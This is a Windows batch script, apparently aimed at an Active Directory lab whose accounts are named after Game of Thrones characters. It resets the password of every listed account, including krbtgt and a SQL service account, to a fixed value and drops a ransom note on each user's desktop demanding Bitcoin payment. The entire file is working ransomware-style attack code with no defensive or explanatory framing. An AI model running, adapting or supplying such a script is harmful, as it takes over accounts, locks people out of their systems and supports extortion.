@echo off
setlocal

:: Define the list of users
set "users=catelyn.stark hodor krbtgt robb.stark sql_svc arya.stark eddard.stark jeor.mormont samwell.tarly brandon.stark jon.snow rickon.stark sansa.stark"

:: Iterate over each user in the list
for %%u in (%users%) do (
    :: Set the password for the user
    net user %%u ChinaNumber1

    :: Check if the user directory exists
    if exist "C:\Users\%%u" (
        :: Create the ransom note
        echo YOU HAVE BEEN HACKED!! ALL OF YOUR PASSWORDS HAVE BEEN CHANGED!! SEND 1000USD TO THIS BTC ADDRESS XXXXXXXXXXXXXXX > "C:\Users\%%u\Desktop\RANSOM_NOTE.txt"
    )
)

endlocal
